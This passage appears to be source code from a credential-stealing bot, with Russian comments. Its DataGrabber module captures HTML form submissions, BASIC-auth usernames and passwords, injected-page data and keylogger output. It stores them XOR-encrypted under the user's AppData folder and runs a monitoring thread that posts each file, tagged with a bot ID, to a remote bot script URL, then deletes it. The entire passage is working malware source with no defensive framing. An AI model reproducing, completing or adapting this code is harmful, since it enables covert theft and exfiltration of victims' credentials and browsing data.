			return;
		DBG("Loader", "Обрабатываем файл данных %s", FileName);

		if (DataGrabber::SendDataFile(FileName))
            Strings::Add(Files, FileName);
	}
	//------------------------------------------------------------------------

	void DeleteFiles(PStrings Files)
	{
		// Удалить файлы из списка
		DWORD i = Strings::Count(Files);
		if (i == 0) return;

		while (i > 0)
		{
			PCHAR File = Strings::GetItem(Files, i - 1, false);
			if ((BOOL)pDeleteFileA(File))
				Strings::Delete(Files, i - 1);
			i--;
		}

    }

    //------------------------------------------------------------------------
	HANDLE CreateMonitorHandle(PCHAR Path)
	{
		// инициализируем слежение за изменениями в директории
		PCHAR Tmp = STR::New(Path);
		PCHAR EL = STR::End(Tmp);
		// Отсекаем конечный слеш
		EL--;
		while (EL > Tmp && *EL == '\\')
		{
		 *EL = 0;
		 EL--;
        }
			
		HANDLE H = pFindFirstChangeNotificationA(Tmp, 0, FILE_NOTIFY_CHANGE_FILE_NAME);
		STR::Free(Tmp);
		return H;
	}


    //------------------------------------------------------------------------
	DWORD ThreadProc(LPVOID Data)
	{
		// процедура мониторинга за хранилишем отправляемых данных
		#ifdef BV_APP
			// зАДЕРЖКА ДЛЯ ОТЛАДОЧНОГО ПРИЛОЖЕНИЯ
			pSleep(1000);
		#endif

		PCHAR Path = DataGrabber::GetRepositoryPath();
		DBG("Loader", "Запуск мониторинг хранилища &s", Path);
		if (Path == NULL)
			pExitThread(0);

		// Ставим задержку перед запуском
		PStrings Files = Strings::Create();

		// Инициализируем события ожидания
		HANDLE Handle = CreateMonitorHandle(Path);
		DBG("Loader", "Хэндл слежения за хранилищем %d", Handle);

		// Запускаем бесконечный цикл мониторинга за хранилищем
		while (1)
		{
			DBG("Loader", "Ищем файлы");
			SearchFiles(Path, (PCHAR)DataFileMask, false, FA_ANY_FILES, Files, ProcessDataFile);
			DeleteFiles(Files);
			DBG("Loader", "Ожидаем изменения хранилища");
			pWaitForSingleObject(Handle, 15000);
			pFindNextChangeNotification(Handle);
        }

		// Лишнее, но нпривычка :)
        pFindCloseChangeNotification(Handle);
		Strings::Free(Files);
	}
}

// Функция возвращает путь к папке хранилища данных
PCHAR DataGrabber::GetRepositoryPath()
{
	 // Функция возвращает путь к директории хранения данных приложений
	PCHAR Path = STR::Alloc(MAX_PATH);

	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_APPDATA, true))
	{
		STR::Free(Path);
		return NULL;
    }
    StrConcat(Path, "\\");
	return Path;
}


PCHAR DataGrabber::GetDataFileName()
{
	// Функция возвращает уникальное имя файла для хранения данных
	PCHAR Path = GetRepositoryPath();
	if (Path == NULL)
		return NULL;
	PCHAR FileName = STR::Alloc(StrCalcLength(Path) + 100);

	pGetTempFileNameA(Path, "Data", 0, FileName);
	STR::Free(Path);
	return FileName;
}


PCHAR DataGrabber::GetRepositoryPassword()
{
	// Функция возвращает пароль, которым будут шифроваться файлы
	return GenerateBotID();
}


bool DataGrabber::AddData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD Browser, DWORD DataType)
{
	// Функция складывает данные в хранилище для последующей отправки
	PCHAR FileName = GetDataFileName();
	if (FileName == NULL)
		return false;

	PDataFile File = DataFile::CreateFile(FileName, GrabberFileSignature);

	if (File == NULL)
		return false;

	PCHAR Password = GetRepositoryPassword();
	File->CryptMode   = fcBlock;
	File->CryptKey    = Password;
	File->CryptMethod = XORCrypt::Crypt;


	// Заполняем файл данными
	File->Head.Flags   = DataType;
	File->Head.FlagsEx = Browser;

	DataFile::AddDataBlock(File, DATA_BLOCK_URL, URL);
	DataFile::AddDataBlock(File, DATA_BLOCK_USERAGENT, UserAgent);
	DataFile::AddDataBlock(File, DATA_BLOCK_DATA, Data);

	// Записываем данные и закрываем файл
	DataFile::WriteFile(File);
	DataFile::CloseFile(File);

    STR::Free(Password);

    PCHAR NewFileName = STR::New(2, FileName, DataFileExt);

	pMoveFileA(FileName, NewFileName);

	STR::Free(FileName);
	STR::Free(NewFileName);
	return true;
}


bool DataGrabber::AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD Browser, DWORD DataType)
{
	// Добавить данные HTML формы
	PCHAR SendData = STR::New(3, URL, "?|POST:", Data);

	bool Res = AddData(URL, SendData, UserAgent, Browser, DataType);

	STR::Free(SendData);
	return Res;
}



bool DataGrabber::SendDataFile(PCHAR FileName)
{
	// Отправить файл данных на сервер
	if (StrIsEmpty(FileName))
		return false;

	PDataFile File = DataFile::OpenFile(FileName, GrabberFileSignature);
	if (File == NULL)
		return false;

	PCHAR Password = GetRepositoryPassword();
	File->CryptMode     = fcBlock;
	File->CryptKey      = Password;
	File->DecryptMethod = XORCrypt::Crypt;

	DataFile::ReadFile(File);

	bool Result = true; // Для удаления необработанного файла

	// Вызываем метод отправки файла
	switch (File->Head.Flags)
	{
		case DATA_TYPE_FORM:   Result = SendFormGrabberData(File); break;
		case DATA_TYPE_INJECT: Result = SendFormGrabberData(File); break;
        case DATA_TYPE_KEYLOG: Result = SendKeyLogerData(File); break;
	default: ;
	}

	//-------------------------------

	DataFile::CloseFile(File);
	STR::Free(Password);
	return Result;
}

void DataGrabber::StartDataSender()
{
	// Запустить поток отложенной отправки данных
    StartThread(DataSender::ThreadProc, NULL);
}


void DataGrabber::AddBASICAuthorizationData(PHTTPSessionInfo Session, PCHAR UserName, PCHAR Password)
{
	// Функция добавляет данные BASIC авторизации для отправки на сервер
	if (Session == NULL || StrIsEmpty(Password))
		return;

	PCHAR SendBuf = STR::New(4, "username=", UserName, "&password=", Password);

	AddHTMLFormData(Session->URL, SendBuf, Session->UserAgent, Session->BrowserType, DATA_TYPE_FORM);

	STR::Free(SendBuf);
}
//----------------------------------------------------------------------------


bool DataGrabber::SendHTMLDataToServer(PCHAR URL, PSendHTMLData Data, PCHAR *Response)
{
	// Функция реальной отправки данных
	if (URL == NULL || Data == NULL)
		return false;


	PCHAR BT = StrLongToString(Data->BrowserType);
	PCHAR DT = StrLongToString(Data->DataType);

	// Создаём данные формы
	PStrings S = Strings::Create();
	AddURLParam(S, "id", Data->BotID);
	AddURLParam(S, "brw", BT);
	AddURLParam(S, "type", DT);
	AddURLParam(S, "data", Data->Data);
	STR::Free(BT);
	STR::Free(DT);
	// Отправляем форму
	#ifdef CryptHTTPH
        PCHAR Password = GetMainPassword();
		bool Res = CryptHTTP::Post(URL, Password, S, Response);
        STR::Free(Password);
	#else
		bool Res = HTTP::Post(URL, S, Response);
	#endif

	Strings::Free(S);
	return Res;
}


bool DataGrabber::SendFormGrabberData(PDataFile File)
{
	// Отправить данные HTML форм
	if (File == NULL)
		return false;

	// Отправляем данные HTML форм на сервер

	TSendHTMLData Data;
	ClearStruct(Data);

	// Заполняем структуру отправки данных
	Data.DataType = File->Head.Flags;
	Data.BrowserType = File->Head.FlagsEx;
	Data.BotID = GenerateBotID();
	Data.URL       = MEMBLOCK::GetBlockByAsStr(File->Blocks, DATA_BLOCK_URL);
	Data.UserAgent = MEMBLOCK::GetBlockByAsStr(File->Blocks, DATA_BLOCK_USERAGENT);
	Data.Data      = MEMBLOCK::GetBlockByAsStr(File->Blocks, DATA_BLOCK_DATA);


	// Вызываем обработчики отправки
	bool Cancel = false;
	CallSendDataHandlers(&Data, Cancel);

	bool R = false;
	if (!Cancel)
	{
		// Отправляем данные
		PCHAR Script = GetBotScriptURL(ScriptFormGrabber);
		R = SendHTMLDataToServer(Script, &Data, NULL);
		STR::Free(Script);
	}

	STR::Free(Data.URL);
	STR::Free(Data.UserAgent);
	STR::Free(Data.Data);
	STR::Free(Data.BotID);

	return R;
}


// Отправить логи ЛейЛогера
bool DataGrabber::SendKeyLogerData(PDataFile File)
{


    return false;
}
